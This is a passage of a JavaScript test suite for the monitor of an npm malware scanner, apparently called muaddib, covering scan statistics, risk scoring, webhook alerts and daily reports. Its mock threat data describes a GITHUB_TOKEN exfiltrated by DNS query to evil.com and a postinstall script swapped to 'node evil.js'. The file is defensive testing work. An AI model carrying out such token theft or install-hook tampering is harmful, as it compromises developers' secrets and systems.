      const today = new Date().toISOString().slice(0, 10);
      assert(data.daily.length === 1, 'Should have 1 daily entry');
      assert(data.daily[0].date === today, 'Daily entry date should be today: ' + today);
      assert(data.daily[0].scanned === 1, 'Daily scanned should be 1');
      assert(data.daily[0].clean === 1, 'Daily clean should be 1');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(SCAN_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(SCAN_STATS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: updateScanStats computes fp_rate correctly', () => {
    const backupExists = fs.existsSync(SCAN_STATS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(SCAN_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(SCAN_STATS_FILE, JSON.stringify({ stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] }), 'utf8');

      // 3 false positives, 1 confirmed → fp_rate = 3/(3+1) = 0.75
      updateScanStats('false_positive');
      updateScanStats('false_positive');
      updateScanStats('false_positive');
      updateScanStats('confirmed');

      const data = loadScanStats();
      const today = new Date().toISOString().slice(0, 10);
      const dayEntry = data.daily.find(d => d.date === today);
      assert(dayEntry, 'Should have daily entry');
      assert(dayEntry.false_positive === 3, 'false_positive should be 3');
      assert(dayEntry.confirmed === 1, 'confirmed should be 1');
      assert(Math.abs(dayEntry.fp_rate - 0.75) < 0.001, 'fp_rate should be 0.75, got ' + dayEntry.fp_rate);
    } finally {
      if (backup !== null) {
        fs.writeFileSync(SCAN_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(SCAN_STATS_FILE); } catch {}
      }
    }
  });

  test('MONITOR: updateScanStats suspect increments suspect + total_scanned', () => {
    const backupExists = fs.existsSync(SCAN_STATS_FILE);
    let backup = null;
    if (backupExists) {
      backup = fs.readFileSync(SCAN_STATS_FILE, 'utf8');
    }
    try {
      const dir = path.dirname(SCAN_STATS_FILE);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(SCAN_STATS_FILE, JSON.stringify({ stats: { total_scanned: 0, clean: 0, suspect: 0, false_positive: 0, confirmed_malicious: 0 }, daily: [] }), 'utf8');

      updateScanStats('suspect');
      const data = loadScanStats();
      assert(data.stats.total_scanned === 1, 'total_scanned should be 1');
      assert(data.stats.suspect === 1, 'suspect should be 1');
    } finally {
      if (backup !== null) {
        fs.writeFileSync(SCAN_STATS_FILE, backup, 'utf8');
      } else {
        try { fs.unlinkSync(SCAN_STATS_FILE); } catch {}
      }
    }
  });

  // ============================================
  // MONITOR ADDITIONAL COVERAGE TESTS
  // ============================================

  console.log('\n=== MONITOR ADDITIONAL COVERAGE TESTS ===\n');

  test('MONITOR: reportStats logs formatted output without error', () => {
    const monitor = require('../../src/monitor.js');
    const origScanned = stats.scanned;
    const origClean = stats.clean;
    const origSuspect = stats.suspect;
    const origErrors = stats.errors;
    const origTotalTimeMs = stats.totalTimeMs;

    stats.scanned = 50;
    stats.clean = 40;
    stats.suspect = 8;
    stats.errors = 2;
    stats.totalTimeMs = 25000;

    let threw = false;
    try {
      monitor.reportStats();
    } catch {
      threw = true;
    }
    assert(!threw, 'reportStats should not throw');

    stats.scanned = origScanned;
    stats.clean = origClean;
    stats.suspect = origSuspect;
    stats.errors = origErrors;
    stats.totalTimeMs = origTotalTimeMs;
  });

  test('MONITOR: reportStats handles zero scanned (no division error)', () => {
    const monitor = require('../../src/monitor.js');
    const origScanned = stats.scanned;
    const origTotalTimeMs = stats.totalTimeMs;

    stats.scanned = 0;
    stats.totalTimeMs = 0;

    let threw = false;
    try {
      monitor.reportStats();
    } catch {
      threw = true;
    }
    assert(!threw, 'reportStats should not throw with zero scanned');

    stats.scanned = origScanned;
    stats.totalTimeMs = origTotalTimeMs;
  });

  test('MONITOR: buildDailyReportEmbed with zero stats shows 0 values', () => {
    const origErrors = stats.errors;
    const origTotalTimeMs = stats.totalTimeMs;
    const origDailyAlerts = [...dailyAlerts];

    stats.errors = 0;
    stats.totalTimeMs = 0;
    dailyAlerts.length = 0;

    const embed = buildDailyReportEmbed();
    const scannedField = embed.embeds[0].fields.find(f => f.name === 'Packages Scanned');
    assert(scannedField, 'Should have Packages Scanned field');
    assert(/^\d+$/.test(scannedField.value), 'Scanned should be a number string');

    const topField = embed.embeds[0].fields.find(f => f.name === 'Top Suspects');
    assert(topField, 'Top Suspects field should exist');

    stats.errors = origErrors;
    stats.totalTimeMs = origTotalTimeMs;
    dailyAlerts.length = 0;
    dailyAlerts.push(...origDailyAlerts);
  });

  test('MONITOR: isBundledToolingOnly returns true for _next/static/chunks/ path', () => {
    const threats = [
      { file: '.next/static/chunks/main-12345.js', severity: 'HIGH', message: 'eval' }
    ];
    assert(isBundledToolingOnly(threats) === true, 'Should recognize _next/static/chunks/ path');
  });

  test('MONITOR: isBundledToolingOnly returns true for mixed bundled files and paths', () => {
    const threats = [
      { file: 'dist/yarn.js', severity: 'HIGH', message: 'eval' },
      { file: '_next/static/chunks/framework-abc.js', severity: 'MEDIUM', message: 'obfuscation' }
    ];
    assert(isBundledToolingOnly(threats) === true, 'Should recognize mix of bundled files and paths');
  });

  test('MONITOR: shouldSendWebhook returns false for HIGH findings without IOC (strict mode)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 1, critical: 0, high: 1, medium: 0, low: 0 }, threats: [
        { type: 'dangerous_call_eval', severity: 'HIGH' }
      ] };
      assert(shouldSendWebhook(result, null) === false,
        'Should return false for HIGH without IOC match');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for CRITICAL with IOC match', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 }, threats: [
        { type: 'known_malicious_package', severity: 'CRITICAL' }
      ] };
      assert(shouldSendWebhook(result, null) === true,
        'Should return true for CRITICAL with IOC match');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns false for CRITICAL without IOC match', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 }, threats: [
        { type: 'shell_exec', severity: 'CRITICAL' }
      ] };
      assert(shouldSendWebhook(result, null) === false,
        'Should return false for CRITICAL without IOC match');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: computeRiskScore with only medium and low', () => {
    // 2*3 + 3*1 = 9
    assert(computeRiskScore({ critical: 0, high: 0, medium: 2, low: 3 }) === 9,
      'Should be 9 for 2 medium + 3 low');
  });

  test('MONITOR: computeRiskScore with missing fields defaults to 0', () => {
    assert(computeRiskScore({}) === 0, 'Should be 0 for empty summary');
  });

  test('MONITOR: recentlyScanned tracks scanned packages', () => {
    const monitor = require('../../src/monitor.js');
    const origSet = new Set(monitor.recentlyScanned);
    monitor.recentlyScanned.clear();

    monitor.recentlyScanned.add('npm/test-pkg@1.0.0');
    assert(monitor.recentlyScanned.has('npm/test-pkg@1.0.0'), 'Should track scanned package');
    assert(!monitor.recentlyScanned.has('npm/other-pkg@1.0.0'), 'Should not have unscanned package');

    monitor.recentlyScanned.clear();
    for (const item of origSet) monitor.recentlyScanned.add(item);
  });

  test('MONITOR: buildTemporalWebhookEmbed handles empty findings', () => {
    const mockResult = {
      packageName: 'empty-findings-pkg',
      latestVersion: '2.0.0',
      previousVersion: '1.0.0',
      suspicious: false,
      findings: [],
      metadata: {
        latestPublishedAt: '2026-01-15T12:00:00.000Z',
        previousPublishedAt: '2025-06-01T00:00:00.000Z'
      }
    };
    const embed = buildTemporalWebhookEmbed(mockResult);
    assert(embed.embeds && embed.embeds.length === 1, 'Should have one embed');
    const changesField = embed.embeds[0].fields.find(f => f.name === 'Changes Detected');
    assert(changesField.value === 'None', 'Changes should be "None" for empty findings');
  });

  test('MONITOR: buildTemporalAstWebhookEmbed handles empty findings', () => {
    const mockResult = {
      packageName: 'empty-ast-pkg',
      latestVersion: '2.0.0',
      previousVersion: '1.0.0',
      suspicious: false,
      findings: [],
      metadata: {
        latestPublishedAt: '2026-01-15T12:00:00.000Z',
        previousPublishedAt: '2025-06-01T00:00:00.000Z'
      }
    };
    const embed = buildTemporalAstWebhookEmbed(mockResult);
    assert(embed.embeds && embed.embeds.length === 1, 'Should have one embed');
    const apisField = embed.embeds[0].fields.find(f => f.name === 'New Dangerous APIs');
    assert(apisField.value === 'None', 'APIs should be "None" for empty findings');
  });

  test('MONITOR: buildPublishAnomalyWebhookEmbed handles empty anomalies', () => {
    const mockResult = {
      packageName: 'empty-anomaly-pkg',
      suspicious: false,
      versionCount: 5,
      anomalies: []
    };
    const embed = buildPublishAnomalyWebhookEmbed(mockResult);
    assert(embed.embeds && embed.embeds.length === 1, 'Should have one embed');
    const anomaliesField = embed.embeds[0].fields.find(f => f.name === 'Anomalies Detected');
    assert(anomaliesField.value === 'None', 'Anomalies should be "None" for empty array');
  });

  test('MONITOR: buildMaintainerChangeWebhookEmbed handles no risk reasons', () => {
    const mockResult = {
      packageName: 'no-risk-pkg',
      suspicious: true,
      findings: [
        {
          type: 'new_maintainer',
          severity: 'HIGH',
          maintainer: { name: 'newguy', email: '' },
          riskAssessment: { riskLevel: 'LOW', reasons: [] },
          description: "New maintainer 'newguy' added"
        }
      ]
    };
    const embed = buildMaintainerChangeWebhookEmbed(mockResult);
    const findingsField = embed.embeds[0].fields.find(f => f.name === 'Findings');
    assert(findingsField, 'Should have Findings field');
    assertIncludes(findingsField.value, 'new_maintainer', 'Should contain finding type');
    assertNotIncludes(findingsField.value, 'Risk:', 'Should not have Risk line with empty reasons');
  });

  test('MONITOR: buildMaintainerChangeWebhookEmbed handles findings with no riskAssessment', () => {
    const mockResult = {
      packageName: 'no-assessment-pkg',
      suspicious: true,
      findings: [
        {
          type: 'new_maintainer',
          severity: 'MEDIUM',
          maintainer: { name: 'someone', email: '' },
          description: "New maintainer 'someone' added"
        }
      ]
    };
    const embed = buildMaintainerChangeWebhookEmbed(mockResult);
    assert(embed.embeds && embed.embeds.length === 1, 'Should have one embed');
    assert(embed.embeds[0].color === 0xf1c40f, 'Color should be yellow for MEDIUM');
  });

  test('MONITOR: buildCanaryExfiltrationWebhookEmbed with no version shows N/A', () => {
    const exfiltrations = [{ token: 'SECRET', foundIn: 'DNS query' }];
    const embed = buildCanaryExfiltrationWebhookEmbed('test-pkg', null, exfiltrations);
    const versionField = embed.embeds[0].fields.find(f => f.name === 'Version');
    assert(versionField.value === 'N/A', 'Version should be N/A when null');
  });

  test('MONITOR: buildCanaryExfiltrationWebhookEmbed with empty exfiltrations shows None', () => {
    const embed = buildCanaryExfiltrationWebhookEmbed('test-pkg', '1.0.0', []);
    const tokensField = embed.embeds[0].fields.find(f => f.name === 'Exfiltrated Tokens');
    assert(tokensField.value === 'None', 'Should show "None" for empty exfiltrations');
  });

  test('MONITOR: buildPublishAnomalyWebhookEmbed CRITICAL color for critical anomaly', () => {
    const mockResult = {
      packageName: 'critical-pub-pkg',
      suspicious: true,
      versionCount: 5,
      anomalies: [
        { type: 'dormant_spike', severity: 'CRITICAL', description: 'Dormant for 2 years' }
      ]
    };
    const embed = buildPublishAnomalyWebhookEmbed(mockResult);
    assert(embed.embeds[0].color === 0xe74c3c, 'Color should be red for CRITICAL');
  });

  test('MONITOR: buildMaintainerChangeWebhookEmbed with empty findings shows None', () => {
    const mockResult = {
      packageName: 'empty-maint-pkg',
      suspicious: false,
      findings: []
    };
    const embed = buildMaintainerChangeWebhookEmbed(mockResult);
    const findingsField = embed.embeds[0].fields.find(f => f.name === 'Findings');
    assert(findingsField.value === 'None', 'Should show "None" for empty findings');
  });

  test('MONITOR: buildTemporalWebhookEmbed handles modified lifecycle scripts', () => {
    const mockResult = {
      packageName: 'mod-pkg',
      latestVersion: '1.1.0',
      previousVersion: '1.0.0',
      suspicious: true,
      findings: [
        { type: 'lifecycle_modified', script: 'postinstall', oldValue: 'node setup.js', newValue: 'node evil.js', severity: 'CRITICAL' }
      ],
      metadata: {
        latestPublishedAt: '2026-02-01T00:00:00.000Z',
        previousPublishedAt: '2025-11-01T00:00:00.000Z',
        maintainers: []
      }
    };
    const embed = buildTemporalWebhookEmbed(mockResult);
    const changesField = embed.embeds[0].fields.find(f => f.name === 'Changes Detected');
    assertIncludes(changesField.value, 'MODIFIED', 'Should say MODIFIED for lifecycle_modified');
    assertIncludes(changesField.value, 'evil.js', 'Should contain the new value');
  });

  // ============================================
  // REPORT CLI TESTS (muaddib report --now / --status)
  // ============================================

  console.log('\n=== REPORT CLI TESTS ===\n');

  test('MONITOR: buildReportFromDisk returns hasData false when no scan stats', () => {
    const result = buildReportFromDisk();
    assert(typeof result.hasData === 'boolean', 'hasData should be boolean');
    assert(typeof result.agg === 'object', 'agg should be object');
    assert(typeof result.agg.scanned === 'number', 'agg.scanned should be number');
    assert(Array.isArray(result.top3), 'top3 should be array');
  });

  test('MONITOR: buildReportEmbedFromDisk returns null when no data', () => {
    // With no scan stats data, should return null
    const embed = buildReportEmbedFromDisk();
    // May or may not be null depending on local data/ state — just check structure
    if (embed) {
      assert(embed.embeds && embed.embeds.length === 1, 'Should have one embed');
      const e = embed.embeds[0];
      assertIncludes(e.title, 'Daily Report', 'Title should contain Daily Report');
      assert(e.fields.length >= 3, 'Should have at least 3 fields');
    }
    // If null, that's valid (no data)
  });

  test('MONITOR: getReportStatus returns correct structure', () => {
    const status = getReportStatus();
    assert('lastDailyReportDate' in status, 'Should have lastDailyReportDate');
    assert(typeof status.scannedSince === 'number', 'scannedSince should be number');
    assert(typeof status.nextReport === 'string', 'nextReport should be string');
    assertIncludes(status.nextReport, '08:00', 'nextReport should mention 08:00');
    assertIncludes(status.nextReport, 'Europe/Paris', 'nextReport should mention Europe/Paris');
  });

  test('MONITOR: buildReportFromDisk top3 is sorted by findings count desc', () => {
    const result = buildReportFromDisk();
    if (result.top3.length >= 2) {
      const counts = result.top3.map(d => d.findings ? d.findings.length : 0);
      for (let i = 1; i < counts.length; i++) {
        assert(counts[i] <= counts[i - 1], 'top3 should be sorted by findings count descending');
      }
    }
  });

  test('MONITOR: buildReportFromDisk agg fields are non-negative', () => {
    const result = buildReportFromDisk();
    assert(result.agg.scanned >= 0, 'scanned should be >= 0');
    assert(result.agg.clean >= 0, 'clean should be >= 0');
    assert(result.agg.suspect >= 0, 'suspect should be >= 0');
  });

  // ============================================
  // DETECTION & SCAN STATS TESTS (TEMP FILES)
  // ============================================

  console.log('\n=== DETECTION & SCAN STATS TESTS ===\n');

  test('MONITOR: loadDetections returns default for missing file', () => {
    const result = loadDetections();
    assert(Array.isArray(result.detections), 'Should have detections array');
  });

  test('MONITOR: getDetectionStats returns correct structure', () => {
    const stats = getDetectionStats();
    assert(typeof stats.total === 'number', 'Should have total count');
    assert(typeof stats.bySeverity === 'object', 'Should have bySeverity');
    assert(typeof stats.byEcosystem === 'object', 'Should have byEcosystem');
    // leadTime may be null if no detections have advisory_at
  });

  test('MONITOR: loadScanStats returns default for missing file', () => {
    const data = loadScanStats();
    assert(data.stats, 'Should have stats object');
    assert(Array.isArray(data.daily), 'Should have daily array');
    assert(typeof data.stats.total_scanned === 'number', 'Should have total_scanned');
  });

  test('MONITOR: isBundledToolingOnly returns true for all bundled files', () => {
    const threats = [
      { file: 'node_modules/pkg/yarn.js', type: 'obfuscation_detected', severity: 'HIGH' },
      { file: 'node_modules/pkg/webpack.js', type: 'obfuscation_detected', severity: 'HIGH' }
    ];
    assert(isBundledToolingOnly(threats) === true, 'All bundled tooling files should return true');
  });

  test('MONITOR: isBundledToolingOnly returns false for mixed files', () => {
    const threats = [
      { file: 'node_modules/pkg/yarn.js', type: 'obfuscation_detected', severity: 'HIGH' },
      { file: 'src/index.js', type: 'dangerous_call_eval', severity: 'HIGH' }
    ];
    assert(isBundledToolingOnly(threats) === false, 'Mixed files should return false');
  });

  test('MONITOR: isBundledToolingOnly returns true for Next.js chunks', () => {
    const threats = [
      { file: '_next/static/chunks/main.js', type: 'obfuscation_detected', severity: 'MEDIUM' }
    ];
    assert(isBundledToolingOnly(threats) === true, 'Next.js chunks should be bundled');
  });

  test('MONITOR: isBundledToolingOnly returns false for empty threats', () => {
    assert(isBundledToolingOnly([]) === false, 'Empty threats should return false');
  });

  test('MONITOR: isBundledToolingOnly returns false when file is null', () => {
    const threats = [{ type: 'dangerous_call_eval', severity: 'HIGH' }];
    assert(isBundledToolingOnly(threats) === false, 'Threats without file should return false');
  });

  test('MONITOR: computeRiskLevel returns correct levels', () => {
    assert(computeRiskLevel({ critical: 1, high: 0, medium: 0, low: 0 }) === 'CRITICAL');
    assert(computeRiskLevel({ critical: 0, high: 1, medium: 0, low: 0 }) === 'HIGH');
    assert(computeRiskLevel({ critical: 0, high: 0, medium: 1, low: 0 }) === 'MEDIUM');
    assert(computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 1 }) === 'LOW');
    assert(computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 0 }) === 'CLEAN');
  });

  test('MONITOR: computeRiskScore caps at 100', () => {
    const score = computeRiskScore({ critical: 10, high: 10, medium: 10, low: 10 });
    assert(score === 100, 'Score should be capped at 100, got ' + score);
  });

  test('MONITOR: computeRiskScore calculates correctly', () => {
    const score = computeRiskScore({ critical: 1, high: 1, medium: 1, low: 1 });
    // 25 + 10 + 3 + 1 = 39
    assert(score === 39, 'Score should be 39, got ' + score);
  });

  test('MONITOR: isPublishAnomalyOnly returns true when only publish is suspicious', () => {
    assert(isPublishAnomalyOnly(null, null, { suspicious: true }, null) === true);
    assert(isPublishAnomalyOnly({ suspicious: false }, null, { suspicious: true }, null) === true);
  });

  test('MONITOR: isPublishAnomalyOnly returns false when combined with other anomalies', () => {
    assert(isPublishAnomalyOnly({ suspicious: true }, null, { suspicious: true }, null) === false);
    assert(isPublishAnomalyOnly(null, { suspicious: true }, { suspicious: true }, null) === false);
    assert(isPublishAnomalyOnly(null, null, { suspicious: true }, { suspicious: true }) === false);
  });

  test('MONITOR: isPublishAnomalyOnly returns false when publish is not suspicious', () => {
    assert(isPublishAnomalyOnly(null, null, null, null) === false);
    assert(isPublishAnomalyOnly(null, null, { suspicious: false }, null) === false);
  });

  test('MONITOR: isCanaryEnabled defaults to true', () => {
    const orig = process.env.MUADDIB_MONITOR_CANARY;
    delete process.env.MUADDIB_MONITOR_CANARY;
    try {
      assert(isCanaryEnabled() === true, 'Should default to true');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_CANARY = orig;
    }
  });

  test('MONITOR: isCanaryEnabled returns false when env=false', () => {
    const orig = process.env.MUADDIB_MONITOR_CANARY;
    process.env.MUADDIB_MONITOR_CANARY = 'false';
    try {
      assert(isCanaryEnabled() === false, 'Should return false');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_CANARY = orig;
      else delete process.env.MUADDIB_MONITOR_CANARY;
    }
  });

  test('MONITOR: buildCanaryExfiltrationWebhookEmbed has correct structure', () => {
    const embed = buildCanaryExfiltrationWebhookEmbed('evil-pkg', '1.0.0', [
      { token: 'GITHUB_TOKEN', foundIn: 'DNS query to evil.com' }
    ]);
    assert(embed.embeds, 'Should have embeds');
    const e = embed.embeds[0];
    assertIncludes(e.title, 'CANARY EXFILTRATION', 'Title should mention canary');
    assert(e.color === 0xe74c3c, 'Color should be red');
    const pkgField = e.fields.find(f => f.name === 'Package');
    assertIncludes(pkgField.value, 'evil-pkg', 'Should contain package name');
  });

  // ============================================
  // EXTENDED COVERAGE TESTS
  // ============================================

  console.log('\n=== MONITOR EXTENDED COVERAGE TESTS ===\n');

  // --- cleanupOrphanTmpDirs ---

  test('MONITOR: cleanupOrphanTmpDirs does not throw on empty dir', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'monitor-cleanup-'));
    try {
      cleanupOrphanTmpDirs();
    } catch (err) {
      assert(false, 'Should not throw: ' + err.message);
    } finally {
      try { fs.rmdirSync(tmpDir); } catch {}
    }
  });

  test('MONITOR: cleanupOrphanTmpDirs cleans up orphan dirs', () => {
    const tmpBase = path.join(os.tmpdir(), 'muaddib-monitor');
    if (!fs.existsSync(tmpBase)) fs.mkdirSync(tmpBase, { recursive: true });
    const orphanDir = path.join(tmpBase, 'orphan-test-' + Date.now());
    fs.mkdirSync(orphanDir, { recursive: true });
    fs.writeFileSync(path.join(orphanDir, 'dummy.txt'), 'test');
    assert(fs.existsSync(orphanDir), 'Orphan dir should exist before cleanup');
    cleanupOrphanTmpDirs();
    assert(!fs.existsSync(orphanDir), 'Orphan dir should be cleaned up');
  });

  test('MONITOR: cleanupOrphanTmpDirs does not throw when tmpBase does not exist', () => {
    // cleanupOrphanTmpDirs checks if the dir exists first; if not, it returns early
    // This just verifies no crash when the base dir is missing
    try {
      cleanupOrphanTmpDirs();
    } catch (err) {
      assert(false, 'Should not throw: ' + err.message);
    }
  });

  // --- sendReportNow ---

  await asyncTest('MONITOR: sendReportNow returns not configured when no webhook', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    try {
      const result = await sendReportNow();
      assert(result.sent === false, 'Should not have sent');
      assertIncludes(result.message, 'not configured', 'Should mention not configured');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
    }
  });

  await asyncTest('MONITOR: sendReportNow returns no data when no scan stats', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
    try {
      const result = await sendReportNow();
      // If there's no scan data on disk, it should return { sent: false, message: 'No data to report' }
      // OR it could succeed if there is existing scan data from previous tests
      assert(typeof result === 'object', 'Should return an object');
      assert(typeof result.sent === 'boolean', 'Should have sent field');
      assert(typeof result.message === 'string', 'Should have message field');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_WEBHOOK_URL = origEnv;
      } else {
        delete process.env.MUADDIB_WEBHOOK_URL;
      }
    }
  });

  // --- buildReportFromDisk extended ---

  test('MONITOR: buildReportFromDisk returns object with expected fields', () => {
    const report = buildReportFromDisk();
    assert(typeof report === 'object', 'Should return object');
    assert(typeof report.hasData === 'boolean', 'Should have hasData field');
    assert(typeof report.agg === 'object', 'Should have agg field');
    assert(typeof report.agg.scanned === 'number', 'agg.scanned should be number');
    assert(typeof report.agg.clean === 'number', 'agg.clean should be number');
    assert(typeof report.agg.suspect === 'number', 'agg.suspect should be number');
    assert(Array.isArray(report.top3), 'top3 should be array');
  });

  test('MONITOR: buildReportEmbedFromDisk returns null or embed', () => {
    const result = buildReportEmbedFromDisk();
    // Returns null when no data, or an embed object when data exists
    assert(result === null || (typeof result === 'object' && result.embeds), 'Should return null or embed');
  });

  test('MONITOR: getReportStatus has expected fields', () => {
    const status = getReportStatus();
    assert(typeof status === 'object', 'Should return object');
    assert(typeof status.lastDailyReportDate === 'string' || status.lastDailyReportDate === null, 'Should have lastDailyReportDate');
    assert(typeof status.scannedSince === 'number', 'Should have scannedSince');
    assert(typeof status.nextReport === 'string', 'Should have nextReport');
  });

  // --- consecutivePollErrors accessor ---

  test('MONITOR: consecutivePollErrors getter/setter works', () => {
    const original = consecutivePollErrors.get();
    consecutivePollErrors.set(5);
    assert(consecutivePollErrors.get() === 5, 'Should be 5 after set');
    consecutivePollErrors.set(0);
    assert(consecutivePollErrors.get() === 0, 'Should be 0 after reset');
    consecutivePollErrors.set(original); // restore
  });

  // --- POLL_MAX_BACKOFF ---

  test('MONITOR: POLL_MAX_BACKOFF is a positive number', () => {
    assert(typeof POLL_MAX_BACKOFF === 'number', 'Should be number');
    assert(POLL_MAX_BACKOFF > 0, 'Should be positive');
    assert(POLL_MAX_BACKOFF === 960000, 'Should be 960000 (16 minutes)');
  });

  // --- reportStats ---

  test('MONITOR: reportStats does not throw and updates lastReportTime', () => {
    const origLog = console.log;
    let logOutput = '';
    console.log = (...args) => { logOutput += args.join(' '); };
    const beforeTime = Date.now();
    try {
      reportStats();
      assert(stats.lastReportTime >= beforeTime, 'lastReportTime should be updated');
      assertIncludes(logOutput, '[MONITOR] Stats:', 'Should log stats');
    } finally {
      console.log = origLog;
    }
  });

  // --- trySendWebhook ---

  await asyncTest('MONITOR: trySendWebhook does nothing when shouldSendWebhook returns false', async () => {
    // No webhook URL set = shouldSendWebhook returns false
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    const origLog = console.log;
    let logOutput = '';
    console.log = (...args) => { logOutput += args.join(' '); };
    try {
      const result = { summary: { critical: 0, high: 0, medium: 1, low: 0, total: 1 }, threats: [] };
      await trySendWebhook('test-pkg', '1.0.0', 'npm', result, null);
      // Should return without sending (no webhook URL)
    } finally {
      console.log = origLog;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
    }
  });

  await asyncTest('MONITOR: trySendWebhook logs suppressed when sandbox score is 0 and low static', async () => {
    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    const origLog = console.log;
    let logOutput = '';
    console.log = (...args) => { logOutput += args.join(' '); };
    try {
      // Low static score (no riskScore), sandbox clean → suppressed
      const result = { summary: { critical: 0, high: 0, medium: 1, low: 0, total: 1 }, threats: [{ type: 'test', severity: 'MEDIUM' }] };
      const sandboxResult = { score: 0, severity: 'CLEAN' };
      await trySendWebhook('test-pkg', '1.0.0', 'npm', result, sandboxResult);
      assertIncludes(logOutput, 'SUPPRESSED', 'Should log SUPPRESSED (not FALSE POSITIVE)');
    } finally {
      console.log = origLog;
      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- runTemporalAstCheck ---

  await asyncTest('MONITOR: runTemporalAstCheck returns null when disabled', async () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    process.env.MUADDIB_MONITOR_TEMPORAL_AST = 'false';
    try {
      const result = await runTemporalAstCheck('express');
      assert(result === null, 'Should return null when disabled');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_MONITOR_TEMPORAL_AST = origEnv;
      } else {
        delete process.env.MUADDIB_MONITOR_TEMPORAL_AST;
      }
    }
  });

  // --- runTemporalPublishCheck ---

  await asyncTest('MONITOR: runTemporalPublishCheck returns null when disabled', async () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = 'false';
    try {
      const result = await runTemporalPublishCheck('express');
      assert(result === null, 'Should return null when disabled');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = origEnv;
      } else {
        delete process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
      }
    }
  });

  // --- runTemporalMaintainerCheck ---

  await asyncTest('MONITOR: runTemporalMaintainerCheck returns null when disabled', async () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
    process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = 'false';
    try {
      const result = await runTemporalMaintainerCheck('express');
      assert(result === null, 'Should return null when disabled');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER = origEnv;
      } else {
        delete process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
      }
    }
  });

  // --- runTemporalCheck ---

  await asyncTest('MONITOR: runTemporalCheck returns null when disabled', async () => {
    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL;
    process.env.MUADDIB_MONITOR_TEMPORAL = 'false';
    try {
      const result = await runTemporalCheck('express');
      assert(result === null, 'Should return null when disabled');
    } finally {
      if (origEnv !== undefined) {
        process.env.MUADDIB_MONITOR_TEMPORAL = origEnv;
      } else {
        delete process.env.MUADDIB_MONITOR_TEMPORAL;
      }
    }
  });

  // --- recentlyScanned ---

  test('MONITOR: recentlyScanned is a Set', () => {
    assert(recentlyScanned instanceof Set, 'Should be a Set');
  });

  test('MONITOR: recentlyScanned add/has/delete works', () => {
    const key = 'npm/test-recentlyscanned-pkg@9.9.9';
    recentlyScanned.add(key);
    assert(recentlyScanned.has(key), 'Should have the key after add');
    recentlyScanned.delete(key);
    assert(!recentlyScanned.has(key), 'Should not have the key after delete');
  });

  // --- KNOWN_BUNDLED_PATHS ---

  test('MONITOR: KNOWN_BUNDLED_PATHS is a non-empty array of strings', () => {
    assert(Array.isArray(KNOWN_BUNDLED_PATHS), 'Should be array');
    assert(KNOWN_BUNDLED_PATHS.length > 0, 'Should not be empty');
    for (const p of KNOWN_BUNDLED_PATHS) {
      assert(typeof p === 'string', 'Each entry should be a string');
    }
  });

  // --- sendDailyReport ---

  await asyncTest('MONITOR: sendDailyReport does nothing when no webhook URL', async () => {
